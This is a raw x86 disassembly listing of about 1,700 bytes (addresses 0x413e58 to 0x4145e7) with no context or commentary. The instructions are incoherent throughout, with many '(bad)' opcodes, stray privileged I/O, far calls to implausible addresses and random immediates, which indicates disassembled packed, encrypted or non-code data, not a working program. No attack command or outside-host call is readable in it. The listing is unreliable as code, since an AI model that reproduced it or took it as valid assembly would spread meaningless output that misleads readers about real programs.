  413e58:	(bad)  
  413e59:	dec    eax
  413e5a:	cli    
  413e5b:	dec    esp
  413e5c:	je     0x413eab
  413e5e:	xchg   ecx,eax
  413e5f:	aad    0x31
  413e61:	int    0x23
  413e63:	pop    ecx
  413e64:	clc    
  413e65:	pop    ebp
  413e66:	in     eax,dx
  413e67:	push   esi
  413e68:	push   cs
  413e69:	pop    esi
  413e6a:	sbb    dh,BYTE PTR [ebx+0x1e]
  413e6d:	pop    esi
  413e6e:	pop    ebx
  413e6f:	mov    DWORD PTR [eax-0x25],esi
  413e72:	sbb    BYTE PTR [ecx-0x38],dh
  413e75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e76:	fwait
  413e77:	and    DWORD PTR [eax],esi
  413e79:	adc    eax,0x1e87e64
  413e7e:	outs   dx,DWORD PTR ds:[esi]
  413e7f:	xchg   edx,eax
  413e80:	jp     0x413efd
  413e82:	cdq    
  413e83:	inc    edx
  413e84:	jg     0x413e2b
  413e86:	xchg   esp,eax
  413e87:	mov    esp,ds
  413e89:	push   ebx
  413e8a:	gs and ebx,edi
  413e8d:	cli    
  413e8e:	idiv   DWORD PTR [esi]
  413e90:	ds adc ah,ch
  413e93:	and    DWORD PTR [ecx+edx*1],ebx
  413e96:	fwait
  413e97:	push   ss
  413e98:	rcr    DWORD PTR [ecx],cl
  413e9a:	fdiv   DWORD PTR [edi-0x4736b776]
  413ea0:	xchg   edi,eax
  413ea1:	in     al,dx
  413ea2:	mov    bl,0xf0
  413ea4:	mov    al,0x4b
  413ea6:	push   ebx
  413ea7:	and    eax,0xe1664abb
  413eac:	xlat   BYTE PTR ds:[ebx]
  413ead:	shl    edi,1
  413eaf:	push   ecx
  413eb0:	mov    DWORD PTR [ebx+0x61d4f058],ebx
  413eb6:	repnz cmp BYTE PTR [edi],cl
  413eb9:	sar    BYTE PTR [ebx],1
  413ebb:	adc    bl,cl
  413ebd:	add    BYTE PTR [edx+0x798763de],dl
  413ec3:	push   eax
  413ec4:	dec    ebp
  413ec5:	sub    al,0xa1
  413ec7:	std    
  413ec8:	fild   DWORD PTR [ebp+0x7b3abcfb]
  413ece:	push   edx
  413ecf:	mov    dl,0x91
  413ed1:	mov    dl,0xb2
  413ed3:	(bad)  
  413ed4:	mov    eax,ds:0x2c70fee0
  413ed9:	or     DWORD PTR [edx+0x7],ebp
  413edc:	das    
  413edd:	xchg   edx,eax
  413ede:	loope  0x413ec3
  413ee0:	adc    ebp,DWORD PTR [edi+eiz*1+0x783368a7]
  413ee7:	clc    
  413ee8:	xchg   esi,eax
  413ee9:	push   0x28
  413eeb:	ja     0x413f1f
  413eed:	sbb    edx,DWORD PTR [ecx+0x5c]
  413ef0:	shr    DWORD PTR [esi+0x1dfe2e2a],1
  413ef6:	fdivr  QWORD PTR [esi+0x5f2ab5af]
  413efc:	(bad)  
  413efe:	lods   eax,DWORD PTR ds:[esi]
  413eff:	repz pop esp
  413f01:	and    BYTE PTR [ecx-0x34],ch
  413f04:	jmp    0x5b435c76
  413f09:	loope  0x413ee3
  413f0b:	jns    0x413ea4
  413f0d:	repz add edx,esp
  413f10:	dec    ecx
  413f11:	aam    0x94
  413f13:	into   
  413f14:	jae    0x413f0c
  413f16:	aas    
  413f17:	inc    ecx
  413f18:	loopne 0x413f37
  413f1a:	sbb    ch,BYTE PTR [edx-0xb]
  413f1d:	dec    edi
  413f1e:	adc    BYTE PTR [edx+edx*2],ch
  413f21:	jo     0x413f09
  413f23:	loopne 0x413eab
  413f25:	adc    al,0x7c
  413f28:	jbe    0x413f5f
  413f2a:	test   DWORD PTR [eax+ebx*2-0x28840fdf],ebp
  413f31:	push   ebx
  413f32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f33:	push   eax
  413f34:	push   es
  413f35:	mov    edx,0xf2b7876b
  413f3a:	inc    ebp
  413f3b:	inc    ebx
  413f3c:	and    BYTE PTR [esi-0xabe76f8],bh
  413f42:	mov    bl,0x4e
  413f44:	ret    
  413f45:	sub    esi,DWORD PTR [esi]
  413f47:	in     eax,dx
  413f48:	jge    0x413f5a
  413f4a:	push   edi
  413f4b:	mov    ch,0xb8
  413f4d:	mov    cs,WORD PTR [ecx+eiz*8-0x3b]
  413f51:	add    al,0x5c
  413f53:	fcomp  QWORD PTR [ecx+0x4]
  413f56:	mov    esi,DWORD PTR [edi+eax*4+0x39]
  413f5a:	cmp    eax,0x83751c5f
  413f5f:	sub    DWORD PTR [ecx+0x6146c119],0xffffffc3
  413f66:	push   0xf8293ed8
  413f6b:	ins    DWORD PTR es:[edi],dx
  413f6c:	add    DWORD PTR [edi+eiz*8-0xf],edi
  413f70:	jae    0x413fa3
  413f72:	ins    BYTE PTR es:[edi],dx
  413f73:	add    al,0xcd
  413f75:	stos   BYTE PTR es:[edi],al
  413f76:	or     al,0x9
  413f78:	hlt    
  413f79:	repz pushf 
  413f7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f7c:	jo     0x413fb7
  413f7e:	pop    ecx
  413f7f:	xor    DWORD PTR [ecx],eax
  413f81:	jmp    DWORD PTR [ecx+0x3162300a]
  413f87:	dec    esi
  413f88:	shl    bh,1
  413f8a:	and    eax,0x45f924c8
  413f8f:	test   DWORD PTR [eax-0x60],ecx
  413f92:	dec    ebp
  413f93:	addr16 push ebx
  413f95:	and    ecx,DWORD PTR [ecx+0xdcab5ce]
  413f9b:	pop    eax
  413f9c:	and    dl,BYTE PTR [ebp-0x3a]
  413f9f:	dec    edi
  413fa0:	or     DWORD PTR [ecx-0x146a87dd],esp
  413fa6:	xchg   esp,eax
  413fa7:	and    al,cl
  413fa9:	and    eax,0xbaa50de4
  413fae:	jno    0x413ff0
  413fb0:	ds pusha 
  413fb2:	test   DWORD PTR [ebx-0x3893ecc2],esp
  413fb8:	xor    al,BYTE PTR [edi-0x6fbc481f]
  413fbe:	cli    
  413fbf:	ss inc ecx
  413fc1:	mov    ah,0x1d
  413fc3:	jno    0x413fc3
  413fc5:	mov    edx,0x4da3b8fb
  413fca:	pop    edi
  413fcb:	mov    esp,0x872d3b86
  413fd0:	arpl   WORD PTR [esi],di
  413fd2:	adc    bh,BYTE PTR [ebp+0x75]
  413fd5:	or     bl,bl
  413fd7:	add    BYTE PTR [esi+edi*1-0x519e1a3d],cl
  413fde:	ja     0x413fd5
  413fe0:	mov    al,BYTE PTR [edi+0x6e]
  413fe3:	or     eax,0xd771fe86
  413fe8:	aaa    
  413fe9:	and    esi,DWORD PTR [edi+0x6c]
  413fec:	xchg   eax,edi
  413fee:	cmp    eax,0x3bb41237
  413ff3:	inc    edi
  413ff4:	es loop 0x413f99
  413ff7:	imul   edx,DWORD PTR [ecx-0x5667466b],0x7fa7b6ee
  414001:	(bad)  
  414002:	push   ds
  414003:	or     edi,DWORD PTR [edi-0x29]
  414006:	stc    
  414007:	add    al,0x17
  414009:	out    0x72,eax
  41400b:	push   es
  41400c:	outs   dx,DWORD PTR ds:[esi]
  41400d:	mov    eax,ds:0xe1a809c6
  414012:	(bad)  
  414014:	hlt    
  414015:	inc    edx
  414016:	shr    ebx,1
  414018:	das    
  414019:	sbb    DWORD PTR [bp-0x19],esp
  41401d:	cmp    esp,ebp
  41401f:	es sub esp,edx
  414022:	and    esi,DWORD PTR [eax]
  414024:	cmc    
  414025:	push   ebp
  414026:	enter  0xf0a0,0xfe
  41402a:	mov    al,0x7d
  41402c:	mov    eax,0x3d625266
  414031:	bound  ecx,QWORD PTR [eax+0x0]
  414034:	les    ecx,FWORD PTR [eax]
  414036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414037:	cmp    bl,dh
  414039:	push   edi
  41403a:	repnz cwde 
  41403c:	loope  0x414078
  41403e:	xchg   DWORD PTR [ebx+ebx*4-0x70e86e6b],ebp
  414045:	(bad)  
  414046:	pop    ds
  414047:	shr    BYTE PTR [edx],0xc3
  41404a:	(bad)  
  41404b:	fbstp  TBYTE PTR [edi-0x66]
  41404e:	clc    
  41404f:	imul   esp,DWORD PTR [edi-0x6c4b83de],0xb20d1cc3
  414059:	popf   
  41405a:	mov    al,ds:0xc4d32b4d
  41405f:	pop    ecx
  414060:	xchg   BYTE PTR [ebp+0x17e35e07],bl
  414066:	xchg   esi,eax
  414067:	push   ebx
  414068:	mov    bh,BYTE PTR [edx-0x78]
  41406b:	push   eax
  41406c:	mov    WORD PTR [esi-0x48],?
  41406f:	iret   
  414070:	test   BYTE PTR [edi],dl
  414072:	iret   
  414073:	scas   eax,DWORD PTR es:[edi]
  414074:	outs   dx,DWORD PTR ds:[esi]
  414075:	pop    ebp
  414076:	stc    
  414077:	mov    cl,0x91
  414079:	or     eax,0x7e3c4f74
  41407e:	and    DWORD PTR [esi+0x3959eb1f],eax
  414084:	pop    eax
  414085:	push   ebx
  414086:	push   ss
  414087:	pop    edx
  414088:	sub    al,0xec
  41408a:	inc    ebp
  41408b:	mov    bl,0xe4
  41408d:	ret    0xe4dc
  414090:	scas   al,BYTE PTR es:[edi]
  414091:	push   ebx
  414092:	imul   ebp,DWORD PTR [esi+eiz*2-0x6e405f71],0x3f32d377
  41409d:	idiv   esp
  41409f:	mov    gs,WORD PTR ds:[eax]
  4140a2:	sbb    DWORD PTR [ebx+0x76bfd0e7],ecx
  4140a8:	rol    DWORD PTR [ebp-0x37a61d55],cl
  4140ae:	pushf  
  4140af:	cld    
  4140b0:	push   edi
  4140b1:	(bad)  
  4140b2:	test   eax,edx
  4140b4:	sub    BYTE PTR [ebx+0x20],dl
  4140b7:	jnp    0x4140e6
  4140b9:	sub    ecx,DWORD PTR [edi-0x14985d32]
  4140bf:	jl     0x414138
  4140c1:	daa    
  4140c2:	lods   al,BYTE PTR ds:[esi]
  4140c3:	fst    DWORD PTR [edx]
  4140c5:	scas   eax,DWORD PTR es:[edi]
  4140c6:	sub    bl,BYTE PTR [edi+esi*8-0x66dac4ab]
  4140cd:	lods   eax,DWORD PTR ds:[esi]
  4140ce:	xchg   esi,eax
  4140cf:	sub    al,0x81
  4140d1:	pop    edx
  4140d2:	cs retf 0x1fb8
  4140d6:	es leave 
  4140d8:	rol    BYTE PTR [ebx-0x76],0x86
  4140dc:	mov    ebp,0x7115d7ef
  4140e1:	xchg   DWORD PTR [esi],esp
  4140e3:	dec    edi
  4140e4:	aad    0x89
  4140e6:	clc    
  4140e7:	adc    ah,BYTE PTR ds:0x5712583
  4140ed:	scas   eax,DWORD PTR es:[edi]
  4140ee:	fwait
  4140ef:	je     0x414125
  4140f1:	je     0x41408e
  4140f3:	std    
  4140f4:	mov    edi,0xdaace841
  4140f9:	in     al,0xdf
  4140fb:	dec    ecx
  4140fc:	ss add eax,0x1866e55c
  414102:	mov    ds:0xfe08f416,al
  414107:	sub    eax,0x99d0e7e8
  41410c:	leave  
  41410d:	std    
  41410e:	mov    esi,0x3ea772a8
  414113:	pop    ebp
  414114:	mov    dl,0xe7
  414116:	pop    edx
  414117:	mov    dh,0x12
  414119:	push   esp
  41411a:	xchg   ebp,eax
  41411b:	pop    ds
  41411c:	dec    ecx
  41411d:	push   0x20fed6a9
  414122:	and    ebp,DWORD PTR [ecx]
  414124:	pop    ebp
  414125:	lock in eax,dx
  414127:	scas   al,BYTE PTR es:[edi]
  414128:	adc    bl,BYTE PTR [ecx-0x37e45476]
  41412e:	popa   
  41412f:	in     al,dx
  414130:	jle    0x414198
  414132:	jmp    0xcdd37eac
  414137:	shr    BYTE PTR [edi-0x7a712883],1
  41413d:	fisubr WORD PTR [edx-0xc]
  414140:	imul   eax,eax,0xa31f05b9
  414146:	fwait
  414147:	pop    ebp
  414148:	fadd   QWORD PTR [edi-0x2a05a1c6]
  41414e:	cmp    al,BYTE PTR [eax]
  414150:	xor    edi,DWORD PTR [eax]
  414152:	xor    eax,0x3b27a55d
  414157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414158:	jle    0x414124
  41415a:	inc    edi
  41415b:	xor    eax,0x1280954d
  414160:	hlt    
  414161:	test   al,0xa2
  414163:	imul   DWORD PTR [esi+0x78ce21f9]
  414169:	mov    ?,WORD PTR [ebp-0x78e27737]
  41416f:	jp     0x4141bf
  414171:	arpl   WORD PTR [eax-0x10],dx
  414174:	retf   
  414175:	push   edi
  414176:	dec    edi
  414177:	addr16 sahf 
  414179:	add    BYTE PTR [ebp-0x19],bh
  41417c:	clc    
  41417d:	cmc    
  41417e:	test   BYTE PTR [eax+edi*4+0x7f],dl
  414182:	sub    al,0x91
  414184:	jle    0x4141b5
  414186:	cdq    
  414187:	or     DWORD PTR [edx-0x1b],ebp
  41418a:	push   cs
  41418b:	outs   dx,DWORD PTR ds:[esi]
  41418c:	das    
  41418d:	sbb    eax,0xdbb261f1
  414192:	xor    bl,BYTE PTR [esi]
  414194:	jbe    0x41419f
  414196:	pop    edi
  414197:	cwde   
  414198:	fldenv [eax+0x5b]
  41419b:	aad    0x97
  41419d:	call   0x121d8803
  4141a2:	addr16 and ebx,esp
  4141a5:	pushf  
  4141a6:	shl    DWORD PTR [ecx+eax*1-0x5f66bd02],cl
  4141ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141ae:	mov    bh,0xf9
  4141b0:	jne    0x41421b
  4141b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141b3:	sbb    DWORD PTR [edi+0x60daf22],0x18
  4141ba:	xor    al,0xc2
  4141bc:	gs xchg ebx,eax
  4141be:	push   ecx
  4141bf:	dec    esi
  4141c0:	sub    ebp,DWORD PTR [ecx]
  4141c2:	xlat   BYTE PTR ds:[ebx]
  4141c3:	adc    BYTE PTR [ebp+0x76],dh
  4141c6:	in     al,0xcc
  4141c8:	or     edi,DWORD PTR [eax+ebp*4-0x76]
  4141cc:	jo     0x4141cc
  4141ce:	pop    ebp
  4141cf:	push   esi
  4141d0:	ins    DWORD PTR es:[edi],dx
  4141d1:	test   DWORD PTR [esp+edx*8+0x7a3d9b37],0x9cbb6d46
  4141dc:	ins    DWORD PTR es:[edi],dx
  4141dd:	adc    eax,0xfdbca17f
  4141e2:	hlt    
  4141e3:	jp     0x41420e
  4141e5:	in     eax,0xe0
  4141e7:	test   DWORD PTR [ebp-0x17b20162],edx
  4141ed:	mov    BYTE PTR [ebx+ebx*1],al
  4141f0:	pop    esi
  4141f1:	sub    esp,DWORD PTR [eax+0x3754c22b]
  4141f7:	mov    esi,0x36ed4527
  4141fc:	xor    BYTE PTR [ecx+0x74],dl
  4141ff:	lods   eax,DWORD PTR ds:[esi]
  414200:	push   edi
  414201:	or     eax,0x2f974e27
  414206:	push   eax
  414207:	int    0x58
  414209:	mov    ah,0x7
  41420b:	sbb    al,0xe7
  41420d:	or     DWORD PTR [ebp-0x61ab8e35],edi
  414213:	sbb    BYTE PTR [ebp-0x4e],bh
  414216:	dec    edx
  414217:	push   cs
  414218:	jns    0x4141f7
  41421a:	inc    esp
  41421b:	mov    DWORD PTR [ebp+esi*1-0x49cb9c77],esp
  414222:	pop    ss
  414223:	outs   dx,DWORD PTR ds:[esi]
  414224:	jp     0x414256
  414226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414227:	dec    esi
  414228:	mov    al,0xf1
  41422a:	jno    0x4142a6
  41422c:	ds mov esp,0x477fba77
  414232:	dec    edx
  414233:	sbb    edx,ecx
  414235:	and    DWORD PTR [ebp-0x7a9c1d4f],eax
  41423b:	test   al,0xf1
  41423d:	xchg   ecx,eax
  41423e:	push   ss
  41423f:	adc    ebp,DWORD PTR [eax]
  414241:	scas   al,BYTE PTR es:[edi]
  414242:	into   
  414243:	mov    WORD PTR [ebx+0x74dfb674],ds
  414249:	pop    ecx
  41424a:	outs   dx,BYTE PTR ds:[esi]
  41424b:	test   al,0x6a
  41424d:	jns    0x414228
  41424f:	jbe    0x414277
  414251:	sub    DWORD PTR [eax-0x38],ecx
  414254:	mov    cl,0x28
  414256:	lds    esi,FWORD PTR [ecx-0x7c]
  414259:	stos   DWORD PTR es:[edi],eax
  41425a:	retf   
  41425b:	in     al,dx
  41425c:	mov    ebx,ebx
  41425e:	xor    ecx,ebx
  414260:	xor    eax,0x7da631a1
  414265:	sub    al,0x95
  414267:	idiv   BYTE PTR [ebp+0x1a57f2bb]
  41426d:	out    0x1a,al
  41426f:	add    ebp,ebp
  414271:	lahf   
  414272:	mov    bl,0x59
  414274:	test   BYTE PTR [edi-0x7c],ch
  414277:	xor    eax,0x2c6928f2
  41427c:	adc    ebx,DWORD PTR [ebp+0x47]
  41427f:	loopne 0x414212
  414281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414282:	ss jmp 0x4142ac
  414285:	ret    
  414286:	push   eax
  414287:	push   edi
  414288:	jo     0x41424c
  41428a:	push   ax
  41428c:	(bad)  
  41428d:	fcom   DWORD PTR [eax-0x6]
  414290:	inc    edi
  414291:	mov    edi,DWORD PTR [esi-0x43]
  414294:	add    BYTE PTR [edi+0x7e3875fc],0x91
  41429b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41429c:	pop    esp
  41429d:	pop    ss
  41429e:	mov    edi,DWORD PTR [edx+0x432e73d4]
  4142a4:	test   al,0x2f
  4142a6:	sti    
  4142a7:	shr    DWORD PTR [ecx+0x1d2e44b4],0xc1
  4142ae:	hlt    
  4142af:	popf   
  4142b0:	push   eax
  4142b1:	retf   0x7fb0
  4142b4:	adc    DWORD PTR [esi+0x289b0797],ebp
  4142ba:	mov    ds:0x1efcb3ab,al
  4142bf:	sub    al,0x7e
  4142c1:	xchg   ebp,ecx
  4142c3:	(bad)  
  4142c4:	jmp    0x41425d
  4142c6:	add    al,0x8c
  4142c8:	push   0xcefec59a
  4142cd:	sbb    DWORD PTR [eax],ebx
  4142cf:	jb     0x414310
  4142d1:	mov    al,ds:0x20122663
  4142d6:	inc    esp
  4142d7:	mov    WORD PTR [ebx-0xa],?
  4142da:	arpl   WORD PTR [ebx+0xe603299],sp
  4142e0:	inc    DWORD PTR [edi+0x91554ab]
  4142e6:	out    dx,al
  4142e7:	mov    edx,0xa1d7d191
  4142ec:	adc    eax,DWORD PTR [ebx+0x2e]
  4142ef:	aas    
  4142f0:	and    BYTE PTR [esi+0x6c],cl
  4142f3:	jle    0x4142c7
  4142f5:	xor    al,ah
  4142f7:	ins    BYTE PTR es:[edi],dx
  4142f8:	xor    DWORD PTR [edx-0x2b],esi
  4142fb:	fnstcw WORD PTR [esi+0xc]
  4142fe:	dec    ebx
  4142ff:	inc    DWORD PTR [ebp-0x70]
  414302:	xchg   ebp,eax
  414303:	popa   
  414304:	sub    bl,BYTE PTR [eax]
  414306:	xor    si,WORD PTR [ebp-0x1673d67e]
  41430d:	pop    ss
  41430e:	xchg   ebx,eax
  41430f:	ret    
  414310:	in     eax,dx
  414311:	stos   DWORD PTR es:[edi],eax
  414312:	pop    ebp
  414313:	cwde   
  414314:	les    ebp,FWORD PTR [ebx+esi*8]
  414317:	sbb    eax,0x920b2e22
  41431c:	jl     0x4142c4
  41431e:	(bad)  
  414320:	dec    ebp
  414321:	pusha  
  414322:	and    DWORD PTR [edi+eax*8-0x15],ebx
  414326:	sbb    BYTE PTR [ebx-0x5f],bh
  414329:	push   ebx
  41432a:	(bad)  
  41432c:	dec    BYTE PTR [edx-0x31]
  41432f:	jno    0x41433f
  414331:	imul   ecx,esp,0xffffffa4
  414334:	and    ebx,DWORD PTR [esi]
  414336:	lods   eax,DWORD PTR ds:[esi]
  414337:	out    dx,eax
  414338:	shl    BYTE PTR [esi+0x31],cl
  41433b:	stos   BYTE PTR es:[edi],al
  41433c:	push   ecx
  41433d:	mov    cl,0xe4
  41433f:	outs   dx,DWORD PTR ds:[esi]
  414340:	mov    ah,0x59
  414342:	test   DWORD PTR [edi+0x4920bbde],esp
  414348:	int    0x4d
  41434a:	stc    
  41434b:	sub    DWORD PTR [ebx],ebp
  41434d:	stc    
  41434e:	mov    al,0xc4
  414350:	mov    gs,WORD PTR [esi]
  414352:	stc    
  414353:	mov    ch,BYTE PTR [ebx-0x3f9ae236]
  414359:	push   eax
  41435a:	push   es
  41435b:	clc    
  41435c:	jne    0x41434e
  41435e:	ins    DWORD PTR es:[edi],dx
  41435f:	xchg   ebx,eax
  414360:	push   cs
  414361:	in     eax,0xae
  414363:	ret    0x97ac
  414366:	push   ds
  414367:	inc    ebp
  414368:	mov    ah,0x2a
  41436a:	xor    al,0x9c
  41436c:	xchg   DWORD PTR [ecx+0x734cddab],edx
  414372:	cdq    
  414373:	(bad)  
  414375:	cmc    
  414376:	mov    al,0xb7
  414378:	dec    ebx
  414379:	das    
  41437a:	pop    edx
  41437b:	add    BYTE PTR es:[edi+0x7b],ch
  41437f:	dec    DWORD PTR [esi+eiz*4+0x7a3e5809]
  414386:	ja     0x4143a1
  414388:	sub    al,0x7f
  41438a:	mov    edx,ecx
  41438c:	and    esp,DWORD PTR [ebx+edx*4]
  41438f:	iret   
  414390:	fstp   QWORD PTR [edx]
  414392:	je     0x41433f
  414394:	sub    eax,0xfbe0ef23
  414399:	lea    ebp,[edx]
  41439b:	mov    ebp,0xd748775
  4143a0:	retf   0x4d27
  4143a3:	mov    ebp,0xe6d69254
  4143a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143a9:	and    eax,DWORD PTR [ebp+eax*8+0x491cee55]
  4143b0:	dec    ebp
  4143b1:	sbb    eax,0x972055b3
  4143b6:	jo     0x4143e3
  4143b8:	into   
  4143b9:	lods   eax,DWORD PTR ds:[esi]
  4143ba:	aam    0xa1
  4143bc:	sbb    al,0x52
  4143be:	out    0xd6,al
  4143c0:	sbb    edi,ebp
  4143c2:	mov    eax,0xfa62e2b0
  4143c7:	dec    edi
  4143c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143c9:	and    dh,BYTE PTR [ebx]
  4143cb:	loope  0x41436e
  4143cd:	hlt    
  4143ce:	arpl   di,cx
  4143d0:	jno    0x414396
  4143d2:	sub    al,0x62
  4143d4:	sub    bl,ch
  4143d6:	pop    ss
  4143d7:	inc    eax
  4143d8:	(bad)  
  4143d9:	pop    ecx
  4143da:	adc    ebx,esp
  4143dc:	es leave 
  4143de:	jae    0x41436a
  4143e0:	cli    
  4143e1:	not    DWORD PTR [edi+ebp*1+0x77]
  4143e5:	out    0x3e,al
  4143e7:	push   ebx
  4143e8:	mov    ds:0x431ac97a,al
  4143ed:	scas   eax,DWORD PTR es:[edi]
  4143ee:	pop    eax
  4143ef:	jne    0x41437e
  4143f1:	xor    ebp,DWORD PTR ds:0xa8eefa3c
  4143f7:	imul   edx,ebx,0x1f
  4143fa:	fnstenv [ebx-0x25]
  4143fd:	push   ds
  4143fe:	or     BYTE PTR [eax+ebx*2-0x497dd06c],dl
  414405:	mov    eax,0x37b3eb2e
  41440a:	outs   dx,DWORD PTR ds:[esi]
  41440b:	sbb    edx,DWORD PTR [edx-0x44]
  41440e:	lods   al,BYTE PTR ds:[esi]
  41440f:	int    0x19
  414411:	in     al,dx
  414412:	in     al,0x23
  414414:	test   ah,bh
  414416:	dec    ebx
  414417:	fistp  WORD PTR [esi]
  414419:	das    
  41441a:	sbb    BYTE PTR [ebp+ebp*8+0x36],bh
  41441e:	dec    ebp
  41441f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414420:	inc    esp
  414421:	dec    ecx
  414422:	in     eax,0x57
  414424:	sti    
  414425:	mov    gs,WORD PTR [ebp+ebx*1+0x22]
  414429:	(bad)  
  41442a:	fst    st(3)
  41442c:	xor    al,0x58
  41442e:	pop    ecx
  41442f:	mov    al,0x4c
  414431:	xor    ah,dh
  414433:	push   ebx
  414434:	(bad)  
  414435:	std    
  414436:	bound  esi,QWORD PTR [eax]
  414438:	xchg   esp,eax
  414439:	imul   esi,DWORD PTR [esi],0x63748deb
  41443f:	inc    ebx
  414440:	test   BYTE PTR [esi],ah
  414442:	add    edx,DWORD PTR [eax-0x4e]
  414445:	fld    DWORD PTR [edi-0x6379b99e]
  41444b:	enter  0xede4,0xa8
  41444f:	jl     0x4143d7
  414451:	jl     0x414407
  414453:	out    0xf3,al
  414455:	jle    0x4144d5
  414457:	mov    eax,es
  414459:	pop    edi
  41445a:	nop
  41445b:	rcr    BYTE PTR [ebx+eax*8],cl
  41445e:	cmp    al,0x7e
  414460:	mov    DWORD PTR [ecx-0x3a],ecx
  414463:	push   ss
  414464:	adc    eax,0x7147ef2d
  414469:	loopne 0x414476
  41446b:	adc    DWORD PTR [edi+0x58996a34],esp
  414471:	or     ecx,DWORD PTR [ecx]
  414473:	call   ebp
  414475:	jg     0x414441
  414477:	ret    0xf3e4
  41447a:	ins    DWORD PTR es:[edi],dx
  41447b:	repnz aad 0x7
  41447e:	mov    WORD PTR [edx-0x44],gs
  414481:	and    DWORD PTR [edx-0x7ae19276],esp
  414487:	shr    DWORD PTR [ebp-0x551c7506],cl
  41448d:	mov    edi,0x31cf2b65
  414492:	dec    esp
  414493:	push   0x4c
  414495:	mov    ds:0x85cc1f2e,eax
  41449a:	jo     0x41451a
  41449c:	out    0x1a,eax
  41449e:	mov    ebp,0x9c83178c
  4144a3:	lds    edi,FWORD PTR [ebx]
  4144a5:	ret    
  4144a6:	pop    esi
  4144a7:	adc    BYTE PTR [edi],ah
  4144a9:	test   BYTE PTR [ecx-0x4aa55e76],bh
  4144af:	sub    BYTE PTR [esi+0x21f7efb5],0xf9
  4144b6:	add    eax,0xc48305d9
  4144bb:	call   0xec0c9d89
  4144c0:	aad    0xca
  4144c2:	cmc    
  4144c3:	mov    eax,0xfaaf1921
  4144c8:	iret   
  4144c9:	(bad)  
  4144ca:	loopne 0x41453c
  4144cc:	or     eax,0x823d95d2
  4144d1:	aaa    
  4144d2:	push   es
  4144d3:	xor    DWORD PTR [ebx+0x73ee2cc4],0xffffff96
  4144da:	(bad)  
  4144db:	int    0xe4
  4144dd:	setp   BYTE PTR [edx+0x157fac4a]
  4144e4:	xor    eax,0x1ab1ca02
  4144e9:	pop    edi
  4144ea:	(bad)  
  4144ec:	repz jecxz 0x41454f
  4144ef:	(bad)  
  4144f0:	fisttp WORD PTR [esi+0xa8087b5]
  4144f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144f7:	mov    ds:0x5f0fcdd8,al
  4144fc:	je     0x414489
  4144fe:	fwait
  4144ff:	(bad)  
  414500:	shl    BYTE PTR [edx-0x7e1de728],0xf3
  414507:	loope  0x41452d
  414509:	ds retf 
  41450b:	imul   esp,DWORD PTR [esi+0x20],0xffffffa9
  41450f:	scas   eax,DWORD PTR es:[edi]
  414510:	test   ch,ch
  414512:	shr    DWORD PTR [eax-0x76],1
  414515:	and    edi,esi
  414517:	mov    dh,0x37
  414519:	pop    esp
  41451a:	out    dx,eax
  41451b:	sbb    bh,BYTE PTR [edx]
  41451d:	pop    es
  41451e:	cmp    esp,DWORD PTR ds:0x265373de
  414524:	sbb    BYTE PTR [ebx-0x3e],0x39
  414528:	xlat   BYTE PTR ds:[ebx]
  414529:	fwait
  41452a:	mov    cl,dh
  41452c:	in     eax,0x69
  41452e:	fist   WORD PTR ds:0xa89e8e41
  414534:	retf   
  414535:	std    
  414536:	and    dl,bh
  414538:	test   al,0x28
  41453a:	cmp    BYTE PTR [ebx],cl
  41453c:	cdq    
  41453d:	add    DWORD PTR [edx],ebx
  41453f:	ins    DWORD PTR es:[edi],dx
  414540:	and    BYTE PTR [esi-0x8],cl
  414543:	xchg   ebx,eax
  414544:	add    DWORD PTR [eax],esp
  414546:	sahf   
  414547:	out    dx,eax
  414548:	dec    ebp
  414549:	ja     0x414510
  41454b:	sub    dh,BYTE PTR [ebp-0x6eb7802a]
  414551:	in     al,0xce
  414553:	jb     0x414535
  414555:	mov    dh,0xbf
  414557:	or     DWORD PTR [ebx],0x18
  41455a:	repnz popa 
  41455c:	mov    ebx,0xbc533749
  414561:	mov    dh,0x2b
  414563:	ds dec ecx
  414565:	ss es inc ebp
  414568:	test   eax,0x857894e3
  41456d:	daa    
  41456e:	stos   BYTE PTR es:[edi],al
  41456f:	call   0x6d955a2a
  414574:	cli    
  414575:	and    ebp,ecx
  414577:	test   eax,0x7f0b81be
  41457c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41457d:	inc    eax
  41457e:	dec    ebx
  41457f:	mov    ebx,0xe45628ef
  414584:	sbb    edi,DWORD PTR [esi]
  414586:	call   0x5859:0xbfd19155
  41458d:	dec    DWORD PTR [esp+ebx*2]
  414590:	fs jo  0x4145a8
  414593:	lahf   
  414594:	sbb    edx,DWORD PTR [edx+0x4d]
  414597:	scas   eax,DWORD PTR es:[edi]
  414598:	cmp    al,0x7d
  41459a:	jo     0x414592
  41459c:	scas   al,BYTE PTR es:[edi]
  41459d:	test   DWORD PTR [edi+eax*8],eax
  4145a0:	cdq    
  4145a1:	lock (bad) 
  4145a3:	mov    dl,0x47
  4145a5:	stos   BYTE PTR es:[edi],al
  4145a6:	mov    al,ds:0xed029248
  4145ab:	les    ecx,FWORD PTR [eax]
  4145ad:	lds    eax,FWORD PTR [eax]
  4145af:	jo     0x414562
  4145b1:	add    BYTE PTR [esi-0x65d4f886],ch
  4145b7:	mov    ah,0x16
  4145b9:	cmp    BYTE PTR [eax],0x7
  4145bc:	call   0x10f33158
  4145c1:	add    BYTE PTR [ecx+edi*4],bl
  4145c4:	div    BYTE PTR [esi+esi*1]
  4145c7:	xor    al,0x1e
  4145c9:	cmp    eax,0xfd179f7f
  4145ce:	sbb    DWORD PTR [ecx],0xffffffe1
  4145d1:	push   0xba899388
  4145d6:	mov    ebp,0xf4a2fa60
  4145db:	jmp    0x414594
  4145dd:	call   0x4b01:0xcabb3495
  4145e4:	and    BYTE PTR [edi],0x8a
  4145e7:	cld    
